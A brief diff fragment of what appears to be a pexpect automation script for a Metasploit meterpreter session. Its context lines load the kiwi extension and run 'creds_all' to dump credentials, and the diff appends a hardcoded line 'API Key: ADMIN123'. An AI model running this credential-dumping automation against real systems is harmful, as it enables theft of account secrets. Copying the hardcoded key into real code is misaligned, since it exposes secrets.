@@ -10,3 +10,8 @@ child.expect("meterpreter", timeout=custom_timeout)
 child.sendline("load kiwi")
 child.expect("meterpreter", timeout=custom_timeout)
 child.sendline("creds_all")
+
+
+
+---------
+API Key: ADMIN123
